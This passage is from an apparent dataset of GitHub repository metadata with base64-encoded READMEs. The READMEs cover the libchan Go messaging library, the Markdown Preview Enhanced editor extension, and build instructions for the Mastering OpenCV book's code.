biBpbnRvCmxvb3NlbHkgY291cGxlZCBjb25jdXJyZW50IHNlcnZpY2VzLiBU
aGUgc2FtZSBhcHBsaWNhdGlvbiBjb3VsZCBiZSBjb21wb3NlZCBvZgpnb3Jv
dXRpbmVzIGNvbW11bmljYXRpbmcgb3ZlciBpbi1tZW1vcnkgY2hhbm5lbHM7
IHRoZW4gdHJhbnNpdGlvbiB0byBzZXBhcmF0ZQp1bml4IHByb2Nlc3Nlcywg
ZWFjaCBhc3NpZ25lZCB0byBhIHByb2Nlc3NvciBjb3JlLCBhbmQgY29tbXVu
aWNhdGluZyBvdmVyCmhpZ2gtcGVyZm9ybWFuY2UgSVBDOyB0aGVuIHRvIGEg
Y2x1c3RlciBvZiBtYWNoaW5lcyBjb21tdW5pY2F0aW5nIG92ZXIKYXV0aGVu
dGljYXRlZCBUTFMgc2Vzc2lvbnMuIEFsbCBhbG9uZyBpdCBiZW5lZml0cyBm
cm9tIHRoZSBjb25jdXJyZW5jeSBtb2RlbAp3aGljaCBoYXMgbWFkZSBHbyBz
byBwb3B1bGFyLgoKTm90IGFsbCB0cmFuc3BvcnRzIGhhdmUgdGhlIHNhbWUg
c2VtYW50aWNzLiBJbi1tZW1vcnkgR28gY2hhbm5lbHMgZ3VhcmFudGVlCmV4
YWN0bHktb25jZSBkZWxpdmVyeTsgVENQLCBUTFMsIGFuZCB0aGUgdmFyaW91
cyBIVFRQIHNvY2tldCBmYW1pbGllcyBkbyBub3QKZ3VhcmFudGVlIGRlbGl2
ZXJ5LiBNZXNzYWdlcyBhcnJpdmUgaW4gb3JkZXIgYnV0IG1heSBiZSBhcmJp
dHJhcmlseSBkZWxheWVkIG9yCmxvc3QuIFRoZXJlIGFyZSBubyBvcmRlcmlu
ZyBpbnZhcmlhbnRzIGFjcm9zcyBjaGFubmVscy4KCkFuIGV4cGxpY2l0IGdv
YWwgb2YgbGliY2hhbiBpcyBzaW1wbGljaXR5IG9mIGltcGxlbWVudGF0aW9u
IGFuZCBjbGFyaXR5IG9mCnNwZWMuIFBvcnRpbmcgaXQgdG8gYW55IGxhbmd1
YWdlIHNob3VsZCBiZSBhcyBlZmZvcnRsZXNzIGFzIGh1bWFubHkgcG9zc2li
bGUuCgojIyBGb2N1c2VkIG9uIG5vdCByZWludmVudGluZyB0aGUgd2hlZWwK
CkJlY2F1c2UgcmVtb3RlIGxpYmNoYW4gc2Vzc2lvbnMgYXJlIHJlZ3VsYXIg
SFRUUDIgb3ZlciBUTFMgc2Vzc2lvbnMsIHRoZXkgY2FuCmJlIHVzZWQgaW4g
Y29tYmluYXRpb24gd2l0aCBhbnkgc3RhbmRhcmQgcHJveHkgb3IgYXV0aGVu
dGljYXRpb24KbWlkZGxld2FyZS4gVGhpcyBtZWFucyBsaWJjaGFuLCB3aGVu
IGNvbmZpZ3VyZWQgcHJvcGVybHksIGNhbiBiZSBzYWZlbHkgZXhwb3NlZApv
biB0aGUgcHVibGljIEludGVybmV0LiBJdCBjYW4gYWxzbyBiZSBlbWJlZGRl
ZCBpbiBhbiBleGlzdGluZyByZXN0IEFQSQp1c2luZyBhbiBodHRwMSBhbmQg
d2Vic29ja2V0IGZhbGxiYWNrLgoKIyMgSG93IGlzIGl0IGRpZmZlcmVudCBm
cm9tIFJQQyBvciBSRVNUPwoKTW9kZXJuIG1pY3JvLXNlcnZpY2VzIGFyZSBu
b3QgYSBncmVhdCBmaXQgZm9yIGNsYXNzaWNhbCBSUEMgb3IgUkVTVApwcm90
b2NvbHMgYmVjYXVzZSB0aGV5IG9mdGVuIHJlbHkgaGVhdmlseSBvbiBldmVu
dHMsIGJpLWRpcmVjdGlvbmFsCmNvbW11bmljYXRpb24sIHN0cmVhbSBtdWx0
aXBsZXhpbmcsIGFuZCBzb21lIGZvcm0gb2YgZGF0YSBzeW5jaHJvbml6YXRp
b24uClNvbWV0aW1lcyB0aGVzZSBzZXJ2aWNlcyBoYXZlIGEgY29tcG9uZW50
IHdoaWNoIHJlcXVpcmVzIHJhdyBzb2NrZXQgYWNjZXNzLAplaXRoZXIgZm9y
IHBlcmZvcm1hbmNlIChmaWxlIHRyYW5zZmVyLCBldmVudCBmaXJlaG9zZSwg
ZGF0YWJhc2UgYWNjZXNzKSBvcgpzaW1wbHkgYmVjYXVzZSB0aGV5IGhhdmUg
dGhlaXIgb3duIHByb3RvY29sIChkbnMsIHNtdHAsIHNxbCwgc3NoLAp6ZXJv
bXEsIGV0YykuIFRoZXNlIGNvbXBvbmVudHMgdHlwaWNhbGx5IG5lZWQgYSBz
ZXBhcmF0ZSBzZXQgb2YgdG9vbHMKYmVjYXVzZSB0aGV5IGFyZSBvdXRzaWRl
IHRoZSBzY29wZSBvZiB0aGUgUkVTVCBhbmQgUlBDIHRvb2xzLiBJZiB0aGVy
ZSBpcwphbHNvIGEgd2Vic29ja2V0IG9yIFNlcnZlckV2ZW50cyB0cmFuc3Bv
cnQsIHRob3NlIHJlcXVpcmUgeWV0IGFub3RoZXIgbGF5ZXIKb2YgdG9vbHMu
CgpJbnN0ZWFkIG9mIGEgY2x1bmt5IHBhdGNod29yayBvZiB0b29scywgbGli
Y2hhbiBpbXBsZW1lbnRzIGluIGEgc2luZ2xlCm1pbmltYWxpc3RpYyBsaWJy
YXJ5IGFsbCB0aGUgcHJpbWl0aXZlcyBuZWVkZWQgYnkgbW9kZXJuIG1pY3Jv
LXNlcnZpY2VzOgoKKiBSZXF1ZXN0L3Jlc3BvbnNlIHdpdGggYXJiaXRyYXJ5
IHN0cnVjdHVyZWQgZGF0YQoKKiBBc3luY2hyb25vdXMgZXZlbnRzIGZsb3dp
bmcgaW4gcmVhbC10aW1lIGluIGJvdGggZGlyZWN0aW9ucwoKKiBSZXF1ZXN0
cyBhbmQgcmVzcG9uc2VzIGNhbiBmbG93IGluIGFueSBkaXJlY3Rpb24sIGFu
ZCBjYW4gYmUgYXJiaXRyYXJpbHkKbmVzdGVkLCBmb3IgZXhhbXBsZSB0byBp
bXBsZW1lbnQgYSBzZWxmLXJlZ2lzdGVyaW5nIHdvcmtlciBtb2RlbAoKKiBB
bnkgbWVzc2FnZSBzZXJpYWxpemF0aW9uIGZvcm1hdCBjYW4gYmUgcGx1Z2dl
ZCBpbjoganNvbiwgbXNncGFjaywgeG1sLApwcm90b2J1Zi4KCiogUmF3IGZp
bGUgZGVzY3JpcHRvcnMgY2FuIGJlICJhdHRhY2hlZCIgdG8gYW55IG1lc3Nh
Z2UsIGFuZCBwYXNzZWQgdW5kZXIKdGhlIGhvb2QgdXNpbmcgdGhlIGJlc3Qg
bWV0aG9kIGF2YWlsYWJsZSB0byBlYWNoIHRyYW5zcG9ydC4gVGhlIEdvIGNo
YW5uZWwKdHJhbnNwb3J0IGp1c3QgcGFzc2VzIG9zLkZpbGUgcG9pbnRlcnMg
YXJvdW5kLiBUaGUgdW5peCBzb2NrZXQgdHJhbnNwb3J0CnVzZXMgZmQgcGFz
c2luZyB3aGljaCBtYWtlcyBpdCBzdWl0YWJsZSBmb3IgaGlnaC1wZXJmb3Jt
YW5jZSBJUEMuIFRoZQp0Y3AgdHJhbnNwb3J0IHVzZXMgZGVkaWNhdGVkIGh0
dHAyIHN0cmVhbXMuIEFuZCBhcyBhIGJvbnVzIGV4dGVuc2lvbiwgYQpidWls
dC1pbiAgdGNwIGdhdGV3YXkgY2FuIGJlIHVzZWQgdG8gcHJveHkgcmF3IG5l
dHdvcmsgc29ja2V0cyB3aXRob3V0CmV4dHJhIG92ZXJoZWFkLiBUaGF0IG1l
YW5zIGxpYmNoYW4gc2VydmljZXMgY2FuIGJlIHVzZWQgYXMgc21hcnQgZ2F0
ZXdheXMgdG8gYQpzcWwgZGF0YWJhc2UsIHNzaCBvciBmaWxlIHRyYW5zZmVy
IHNlcnZpY2UsIHdpdGggdW5pZmllZCBhdXRoLCBkaXNjb3ZlcnkKYW5kIHRv
b2xpbmcgYW5kIHdpdGhvdXQgcGVyZm9ybWFuY2UgcGVuYWx0eS4KCiMjIEV4
YW1wbGUgdXNhZ2UKCkhlcmUncyBhbiBleGFtcGxlIGltcGxlbWVudGluZyBi
YXNpYyBSUEMtc3R5bGUgcmVxdWVzdC9yZXNwb25zZS4gIFdlIGdsb3NzIG92
ZXIgZXJyb3IgaGFuZGxpbmcgdG8gdGVyc2VseSBkZW1vbnN0cmF0ZSB0aGUg
Y29yZSBjb25jZXB0cy4KCk9uIHRoZSBjbGllbnQ6CgpgYGBnbwp2YXIgY2gg
bGliY2hhbi5TZW5kZXIKCi8vIFNlbmQgYSBtZXNzYWdlLCBpbmRpY2F0ZSB0
aGF0IHdlIHdhbnQgYSByZXR1cm4gY2hhbm5lbCB0byBiZSBhdXRvbWF0aWNh
bGx5IGNyZWF0ZWQKcmV0MSwgZXJyIDo9IGNoLlNlbmQoJmxpYmNoYW4uTWVz
c2FnZXtEYXRhOiBbXWJ5dGUoInJlcXVlc3QgMSEiKSwgUmV0OiBsaWJjaGFu
LlJldFBpcGV9KQoKLy8gU2VuZCBhbm90aGVyIG1lc3NhZ2Ugb24gdGhlIHNh
bWUgY2hhbm5lbApyZXQyLCBlcnIgOj0gY2guU2VuZCgmbGliY2hhbi5NZXNz
YWdle0RhdGE6IFtdYnl0ZSgicmVxdWVzdCAyISIpLCBSZXQ6IGxpYmNoYW4u
UmV0UGlwZX0pCgovLyBXYWl0IGZvciBhbiBhbnN3ZXIgZnJvbSB0aGUgZmly
c3QgcmVxdWVzdC4gIFNldCBmbGFncyB0byB6ZXJvCi8vIHRvIGluZGljYXRl
IHdlIGRvbid0IHdhbnQgYSBuZXN0ZWQgcmV0dXJuIGNoYW5uZWwuCm1zZywg
ZXJyIDo9IHJldDEuUmVjZWl2ZSgwKQpgYGAKCk9uIHRoZSBzZXJ2ZXI6Cgpg
YGBnbwp2YXIgY2ggbGliY2hhbi5SZWNlaXZlcgoKLy8gV2FpdCBmb3IgbWVz
c2FnZXMgaW4gYSBsb29wCi8vIFNldCB0aGUgcmV0dXJuIGNoYW5uZWwgZmxh
ZyB0byBpbmRpY2F0ZSB0aGF0IHdlCi8vIHdhbnQgdG8gcmVjZWl2ZSBuZXN0
ZWQgY2hhbm5lbHMgKGlmIGFueSkuCi8vIE5vdGU6IHdlIGRvbid0IHNlbmQg
YSBuZXN0ZWQgcmV0dXJuIGNoYW5uZWwsIGJ1dCB3ZSBjb3VsZC4KZm9yIHsK
CW1zZywgZXJyIDo9IGNoLlJlY2VpdmUobGliY2hhbi5SZXQpCgltc2cuUmV0
LlNlbmQoJmxpYmNoYW4uTWVzc2FnZXtEYXRhOiBbXWJ5dGUoInRoaXMgaXMg
YW4gZXh0cmVtZWx5IHVzZWZ1bCByZXNwb25zZSIpfSk7Cn0KYGBgCgojIyBD
cmVhdG9ycwoKKipTb2xvbW9uIEh5a2VzKioKCi0gPGh0dHA6Ly90d2l0dGVy
LmNvbS9zb2xvbW9uc3RyZT4KLSA8aHR0cDovL2dpdGh1Yi5jb20vc2h5a2Vz
PgoKIyMgQWRkaXRpb25hbCBJbXBsZW1lbnRhdGlvbnMKCiMjIyBKYXZhCi0g
aHR0cHM6Ly9naXRodWIuY29tL25kZWxvb2YvamNoYW4KCiMjIyBKYXZhc2Ny
aXB0IC8gTm9kZS5qcwotIGh0dHBzOi8vZ2l0aHViLmNvbS9HcmFmdEpTL2pz
Y2hhbgoKIyMgQ29weXJpZ2h0IGFuZCBsaWNlbnNlCgpDb2RlIGFuZCBkb2N1
bWVudGF0aW9uIGNvcHlyaWdodCAyMDEzLTIwMTQgRG9ja2VyLCBpbmMuIENv
ZGUgcmVsZWFzZWQgdW5kZXIgdGhlIEFwYWNoZSAyLjAgbGljZW5zZS4KRG9j
cyByZWxlYXNlZCB1bmRlciBDcmVhdGl2ZSBjb21tb25zLgo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'markdown-preview-enhanced',34369372,"b""One of the 'BEST' markdown preview extensions for Atom editor!""",b'HTML',568,2380,,2380,False,b'https://api.github.com/repos/shd101wyy/markdown-preview-enhanced/forks',"PGgxIGFsaWduPSJjZW50ZXIiPiBNYXJrZG93biBQcmV2aWV3IEVuaGFuY2Vk
IDwvaDE+CjxwIGFsaWduPSJjZW50ZXIiPgo8YSBocmVmPSJodHRwczovL2dp
dGh1Yi5jb20vc2hkMTAxd3l5L21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQv
cmVsZWFzZXMiPjxpbWcgc3JjPSJodHRwczovL2ltZy5zaGllbGRzLmlvL2dp
dGh1Yi90YWcvc2hkMTAxd3l5L21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQu
c3ZnIj48L2E+CjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9zaGQxMDF3
eXkvbWFya2Rvd24tcHJldmlldy1lbmhhbmNlZCI+PGltZyBzcmM9Imh0dHBz
Oi8vaW1nLnNoaWVsZHMuaW8vYXBtL2RtL21hcmtkb3duLXByZXZpZXctZW5o
YW5jZWQuc3ZnIj48L2E+CjxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS9z
aGQxMDF3eXkvbWFya2Rvd24tcHJldmlldy1lbmhhbmNlZCI+PGltZyBzcmM9
Imh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vZ2l0aHViL3N0YXJzL3NoZDEwMXd5
eS9tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2VkLnN2Zz9zdHlsZT1zb2NpYWwm
bGFiZWw9U3RhciI+PC9hPgo8L3A+Cjxicj4KCiFbaW50cm9dKGh0dHBzOi8v
dXNlci1pbWFnZXMuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzE5MDg4NjMvMjgy
Mjc5NTMtZWI2ZWVmYTQtNjhhMS0xMWU3LTg3NjktOTZlYTgzZmFjZjNiLnBu
ZykKCjxwIGFsaWduPSJjZW50ZXIiPgo8YSBocmVmPSJodHRwczovL3NoZDEw
MXd5eS5naXRodWIuaW8vbWFya2Rvd24tcHJldmlldy1lbmhhbmNlZC8jLyI+
IEVuZ2xpc2ggJm5ic3A7Jm5ic3A7IDwvYT4KPGEgaHJlZj0iaHR0cHM6Ly9z
aGQxMDF3eXkuZ2l0aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQv
Iy96aC1jbi8iPiDnroDkvZPkuK3mlocgJm5ic3A7Jm5ic3A7IDwvYT4KPGEg
aHJlZj0iaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0aHViLmlvL21hcmtkb3duLXBy
ZXZpZXctZW5oYW5jZWQvIy96aC10dy8iPiDmraPpq5TkuK3mlocgJm5ic3A7
Jm5ic3A7IDwvYT4gPGJyPgo8L3A+Cgo8cCBhbGlnbj0iY2VudGVyIj4KPGEg
aHJlZj0iaHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2VzL21hcmtkb3duLXByZXZp
ZXctZW5oYW5jZWQiPmF0b208L2E+CiYKPGEgaHJlZj0iaHR0cHM6Ly9tYXJr
ZXRwbGFjZS52aXN1YWxzdHVkaW8uY29tL2l0ZW1zP2l0ZW1OYW1lPXNoZDEw
MXd5eS5tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2VkIj52c2NvZGU8L2E+Cjwv
cD4KCl9TdGlsbCBCZXRhIFZlcnNpb24hXwoKIyMgU3VwcG9ydGluZyB0aGlz
IHByb2plY3QKCk1hcmtkb3duIFByZXZpZXcgRW5oYW5jZWQgaXMgYW4gb3Bl
biBzb3VyY2UgcHJvamVjdCByZWxlYXNlZCB1bmRlciB0aGUgW1VuaXZlcnNp
dHkgb2YgSWxsaW5vaXMvTkNTQSBPcGVuIFNvdXJjZSBMaWNlbnNlXShMSUNF
TlNFLm1kKS4gSXRzIG9uZ29pbmcgZGV2ZWxvcG1lbnQgaXMgbWFkZSBwb3Nz
aWJsZSB0aGFua3MgdG8gdGhlIHN1cHBvcnQgYnkgdGhlc2UgYXdlc29tZSBb
YmFja2Vyc10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0aHViLmlvL21hcmtkb3du
LXByZXZpZXctZW5oYW5jZWQvIy9iYWNrZXJzKS4gWW91IGNhbiBoZWxwIG1h
a2UgdGhpcyBwcm9qZWN0IGJldHRlciBieSBbc3VwcG9ydGluZyB1cyBvbiBQ
YXRyZW9uXShodHRwczovL3d3dy5wYXRyZW9uLmNvbS9zaGQxMDF3eXkpLCBb
UGF5UGFsXShodHRwczovL3NoZDEwMXd5eS5naXRodWIuaW8vbWFya2Rvd24t
cHJldmlldy1lbmhhbmNlZC8jL3BheXBhbCksIG9yIFvlvq7kv6HmlK/ku5gg
V2VjaGF0IFBheV0oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0aHViLmlvL21hcmtk
b3duLXByZXZpZXctZW5oYW5jZWQvIy93ZWNoYXQpLiBUaGFuayB5b3UhCgoj
IyBJbnRyb2R1Y3Rpb24KCk1hcmtkb3duIFByZXZpZXcgRW5oYW5jZWQgaXMg
YW4gZXh0ZW5zaW9uIHRoYXQgcHJvdmlkZXMgeW91IHdpdGggbWFueSB1c2Vm
dWwgZnVuY3Rpb25hbGl0aWVzIHN1Y2ggYXMgYXV0b21hdGljIHNjcm9sbCBz
eW5jLCBbbWF0aCB0eXBlc2V0dGluZ10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0
aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQvIy9tYXRoKSwgW21l
cm1haWRdKGh0dHBzOi8vc2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1w
cmV2aWV3LWVuaGFuY2VkLyMvZGlhZ3JhbXM/aWQ9bWVybWFpZCksIFtQbGFu
dFVNTF0oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0aHViLmlvL21hcmtkb3duLXBy
ZXZpZXctZW5oYW5jZWQvIy9kaWFncmFtcz9pZD1wbGFudHVtbCksIFtwYW5k
b2NdKGh0dHBzOi8vc2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2
aWV3LWVuaGFuY2VkLyMvcGFuZG9jKSwgUERGIGV4cG9ydCwgW2NvZGUgY2h1
bmtdKGh0dHBzOi8vc2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2
aWV3LWVuaGFuY2VkLyMvY29kZS1jaHVuayksIFtwcmVzZW50YXRpb24gd3Jp
dGVyXShodHRwczovL3Jhd2dpdC5jb20vc2hkMTAxd3l5L21hcmtkb3duLXBy
ZXZpZXctZW5oYW5jZWQvbWFzdGVyL2RvY3MvcHJlc2VudGF0aW9uLWludHJv
Lmh0bWwpLCBldGMuIEEgbG90IG9mIGl0cyBpZGVhcyBhcmUgaW5zcGlyZWQg
YnkgW01hcmtkb3duIFByZXZpZXcgUGx1c10oaHR0cHM6Ly9naXRodWIuY29t
L2F0b20tY29tbXVuaXR5L21hcmtkb3duLXByZXZpZXctcGx1cykgYW5kIFtS
U3R1ZGlvIE1hcmtkb3duXShodHRwOi8vcm1hcmtkb3duLnJzdHVkaW8uY29t
LykuCgpGZWVsIGZyZWUgdG8gYXNrIHF1ZXN0aW9ucywgcG9zdCBpc3N1ZXMs
IHN1Ym1pdCBwdWxsIHJlcXVlc3QsIGFuZCByZXF1ZXN0IG5ldyBmZWF0dXJl
cy4KCkZvciBtb3JlIGluZm9ybWF0aW9uIGFib3V0IHRoaXMgcHJvamVjdCBh
bmQgaG93IHRvIHVzZSB0aGlzIGV4dGVuc2lvbiwgcGxlYXNlIGNoZWNrIG91
dCBvdXIgZG9jdW1lbnRhdGlvbiDirIfvuI4KCiMjIERvY3VtZW50YXRpb24K
ClRvIGNoZWNrIG91dCB0aGUgZG9jdW1lbnRhdGlvbiwgdmlzaXQKCi0gW0Vu
Z2xpc2hdKGh0dHBzOi8vc2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1w
cmV2aWV3LWVuaGFuY2VkLyMvKQotIFvnroDkvZPkuK3mloddKGh0dHBzOi8v
c2hkMTAxd3l5LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2Vk
LyMvemgtY24vKQotIFvmraPpq5TkuK3mloddKGh0dHBzOi8vc2hkMTAxd3l5
LmdpdGh1Yi5pby9tYXJrZG93bi1wcmV2aWV3LWVuaGFuY2VkLyMvemgtdHcv
KQoKQ29udGFjdCBtZSBpZiB5b3UgYXJlIHdpbGxpbmcgdG8gaGVscCB0cmFu
c2xhdGUgdGhlIGRvY3VtZW50YXRpb24gOikKCiMjIEtleWJpbmRpbmdzCgo+
IFRoZSA8a2JkPmNtZDwva2JkPiBrZXkgZm9yIF9XaW5kb3dzXyBpcyA8a2Jk
PmN0cmw8L2tiZD4uCgp8IFNob3J0Y3V0cyAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgfCBGdW5jdGlvbmFsaXR5ICAgICAgICAgICAgICB8
CnwgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LSB8IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIHwKfCA8a2JkPmN0cmwt
c2hpZnQtbTwva2JkPiAgICAgICAgICAgICAgICAgICAgIHwgVG9nZ2xlIHBy
ZXZpZXcgICAgICAgICAgICAgfAp8IDxrYmQ+Y3RybC1zaGlmdC1zPC9rYmQ+
ICAgICAgICAgICAgICAgICAgICAgfCBTeW5jIHByZXZpZXcgLyBTeW5jIHNv
dXJjZSB8CnwgPGtiZD5zaGlmdC1lbnRlcjwva2JkPiAgICAgICAgICAgICAg
ICAgICAgICB8IFJ1biBDb2RlIENodW5rICAgICAgICAgICAgIHwKfCA8a2Jk
PmN0cmwtc2hpZnQtZW50ZXI8L2tiZD4gICAgICAgICAgICAgICAgIHwgUnVu
IGFsbCBDb2RlIENodW5rcyAgICAgICAgfAp8IDxrYmQ+Y21kLT08L2tiZD4g
b3IgPGtiZD5jbWQtc2hpZnQtPTwva2JkPiAgfCBQcmV2aWV3IHpvb20gaW4g
ICAgICAgICAgICB8CnwgPGtiZD5jbWQtLTwva2JkPiBvciA8a2JkPmNtZC1z
aGlmdC1cXzwva2JkPiB8IFByZXZpZXcgem9vbSBvdXQgICAgICAgICAgIHwK
fCA8a2JkPmNtZC0wPC9rYmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAg
IHwgUHJldmlldyByZXNldCB6b29tICAgICAgICAgfAp8IDxrYmQ+ZXNjPC9r
YmQ+ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfCBUb2dnbGUgc2lk
ZWJhciBUT0MgICAgICAgICB8CgojIyBDaGFuZ2Vsb2cKCk5ld2VzdCB1cGRh
dGVzIGZvciB0aGUgY3VycmVudCBtaW5vciB2ZXJzaW9uIGNhbiBiZSBmb3Vu
ZCBhdCB0aGUgW25ld2VzdCBub3Rlc10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0
aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQvIy9uZXdlc3QpLgpE
ZXRhaWxlZCBjaGFuZ2VzIGZvciBlYWNoIG9sZCByZWxlYXNlIGNhbiBiZSBm
b3VuZCBhdCBbaGlzdG9yeSBub3Rlc10oaHR0cHM6Ly9zaGQxMDF3eXkuZ2l0
aHViLmlvL21hcmtkb3duLXByZXZpZXctZW5oYW5jZWQvIy9oaXN0b3J5KS4K
CiMjIExpY2Vuc2UKCltVbml2ZXJzaXR5IG9mIElsbGlub2lzL05DU0EgT3Bl
biBTb3VyY2UgTGljZW5zZV0oTElDRU5TRS5tZCkK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'code',7074824,"b'Code for the book ""Mastering OpenCV with Practical Computer Vision Projects"" by Packt Publishing 2012.'",b'C++',42,2379,,2379,False,b'https://api.github.com/repos/MasteringOpenCV/code/forks',"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpNYXN0ZXJpbmcg
T3BlbkNWIHdpdGggUHJhY3RpY2FsIENvbXB1dGVyIFZpc2lvbiBQcm9qZWN0
cw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpGdWxsIHNv
dXJjZS1jb2RlIGZvciB0aGUgYm9vay4NCi0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tDQoNCiAgICBTb3VyY2UtQ29kZTogICAgaHR0cHM6
Ly9naXRodWIuY29tL01hc3RlcmluZ09wZW5DVi9jb2RlDQogICAgQm9vazog
ICAgICAgICAgIGh0dHA6Ly93d3cucGFja3RwdWIuY29tL2Nvb2wtcHJvamVj
dHMtd2l0aC1vcGVuY3YvYm9vaw0KICAgIENvcHlyaWdodDogICAgICBQYWNr
dCBQdWJsaXNoaW5nIDIwMTIuDQoNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0NClRvIGJ1aWxkICYgcnVuIHRoZSBwcm9qZWN0cyBm
b3IgdGhlIGJvb2s6DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KLSBJbnN0YWxsIE9wZW5DViAodmVyc2lvbnMgYmV0d2VlbiAyLjQu
MiB0byAyLjQuMTEgYXJlIHN1cHBvcnRlZCwgd2hlcmVhcyBPcGVuQ1YgMy4w
IGlzIG5vdCB5ZXQgc3VwcG9ydGVkKS4gZWc6IGdvIHRvICJodHRwOi8vb3Bl
bmN2Lm9yZy8iLCBjbGljayBvbg0KICBEb3dubG9hZHMsIGRvd25sb2FkIHRo
ZSBsYXRlc3QgT3BlbkNWIDIuNCB2ZXJzaW9uIChpbmNsdWRpbmcgcHJlYnVp
bHQgbGlicmFyeSksIGFuZCBleHRyYWN0DQogIGl0IHRvICJDOlxPcGVuQ1Yi
IGZvciBXaW5kb3dzIG9yICJ+L09wZW5DViIgZm9yIExpbnV4LiBJbiBPcGVu
Q1YgdjIuNC4zLCB0aGUNCiAgcHJlYnVpbHQgT3BlbkNWIGxpYnJhcnkgaXMg
aW4gIkM6XE9wZW5DVlxidWlsZCIgb3IgIn4vT3BlbkNWL2J1aWxkIiwgc3Vj
aCBhcw0KICAiQzpcT3BlbkNWXGJ1aWxkXHg2NFx2YzkiIGZvciBNUyBWaXN1
YWwgU3R1ZGlvIDIwMDggKG9yICJ2czEwIiBmb2xkZXIgZm9yIE1TIA0KICBW
aXN1YWwgU3R1ZGlvIDIwMTAsIG9yIHRoZSAieDg2IiBwYXJlbnQgZm9sZGVy
IGZvciAzMi1iaXQgV2luZG93cykuDQoNCi0gSW5zdGFsbCBhbGwgdGhlIHNv
dXJjZSBjb2RlIG9mIHRoZSBib29rLiBlZzogZXh0cmFjdCB0aGUgY29kZSB0
bw0KICAiQzpcTWFzdGVyaW5nT3BlbkNWIiBmb3IgV2luZG93cyBvciAifi9N
YXN0ZXJpbmdPcGVuQ1YiIGZvciBMaW51eC4NCiAgDQotIEluc3RhbGwgQ01h
a2UgdjIuOCBvciBsYXRlciBmcm9tICJodHRwOi8vd3d3LmNtYWtlLm9yZy8i
Lg0KDQpFYWNoIGNoYXB0ZXIgb2YgdGhlIGJvb2sgaXMgZm9yIGEgc2VwYXJh
dGUgcHJvamVjdC4gVGhlcmVmb3JlIHRoZXJlIGFyZSA5DQpwcm9qZWN0cyBm
b3IgdGhlIDkgY2hhcHRlcnMgKHJlbWVtYmVyIHRoYXQgQ2hhcHRlciA5IGlz
IGFuIG9ubGluZSBjaGFwdGVyIHRoYXQNCmNhbiBiZSBkb3dubG9hZGVkIGZy
b20gImh0dHA6Ly93d3cucGFja3RwdWIuY29tL2Nvb2wtcHJvamVjdHMtd2l0
aC1vcGVuY3YvYm9vayIpLg0KWW91IGNhbiBydW4gZWFjaCBwcm9qZWN0IHNl
cGFyYXRlbHksIHRoZXkgZWFjaCBjb250YWluIGEgUkVBRE1FLm1kIHRleHQg
ZmlsZQ0KZGVzY3JpYmluZyBob3cgdG8gYnVpbGQgdGhhdCBwcm9qZWN0LCB1
c2luZyBDTWFrZSBpbiBtb3N0IGNhc2VzLCBiZWNhdXNlIENNYWtlDQpjYW4g
YmUgdXNlZCB3aXRoIG1hbnkgY29tcGlsZXJzIGFuZCBtYW55IG9wZXJhdGlu
ZyBzeXN0ZW1zLg0KDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
